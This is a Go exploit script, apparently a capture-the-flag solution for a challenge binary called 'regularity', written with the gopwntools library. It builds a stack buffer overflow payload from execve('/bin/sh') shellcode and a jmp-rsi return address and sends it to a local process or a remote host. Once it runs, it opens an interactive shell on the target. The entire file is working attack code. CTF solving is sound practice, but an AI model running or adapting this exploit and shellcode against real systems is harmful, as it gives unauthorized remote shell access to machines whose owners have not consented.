package main

import (
	"os"
	"strings"

	pwn "github.com/7Rocky/gopwntools"
)

func getProcess() *pwn.Conn {
	if len(os.Args) == 1 {
		return pwn.Process("./regularity")
	}

	hostPort := strings.Split(os.Args[1], ":")
	return pwn.Remote(hostPort[0], hostPort[1])
}

func main() {
	io := getProcess()
	defer io.Close()

	shellcode := []byte("\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54\x5f\x52\x5e\x6a\x3b\x58\x0f\x05")
	jmpRsiAddr := uint64(0x401041)

	payload := make([]byte, 272)
	copy(payload, shellcode)
	copy(payload[256:], pwn.P64(jmpRsiAddr))

	io.SendAfter([]byte("Hello, Survivor. Anything new these days?\n"), payload)
	io.Interactive()
}
